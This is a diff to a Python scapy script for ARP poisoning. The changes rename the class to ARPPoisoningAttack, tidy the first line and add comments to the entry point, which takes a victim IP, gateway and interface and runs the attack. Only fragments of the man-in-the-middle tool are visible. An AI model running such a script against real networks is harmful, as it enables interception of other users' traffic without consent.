@@ -1,4 +1,4 @@
-arp_poisioning_scapy_script.ipynbfrom multiprocessing import Process
+from multiprocessing import Process
 from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip
 
 import os
@@ -6,7 +6,7 @@ import sys
 import time
 
 
-class Arper():
+class ARPPoisoningAttack():
     # the def init is how initialization of a class is done, very simmliar to java for those who didnt know
     def __init__(self, victim, gateway, interface="enp0s3"):
         self.victim = victim
@@ -108,14 +108,15 @@ class Arper():
             hwsrc=self.victimMac,
             pdst=self.gateway,
             hwdst='ff:ff:ff:ff:ff:ff'), count=5)
-        
+
+# Starts the program
 if __name__ == '__main__':
-
+    # Assign parameters to variables
     victim = sys.argv[1]
-
     gateway = sys.argv[2]
-
     interface = sys.argv[3]
+    # Initialize Attack
+    attack = ARPPoisoningAttack(victim, gateway, interface)
 
-    myarp = Arper(victim, gateway, interface)
-    myarp.run()
+    # Execute attack
+    attack.run()
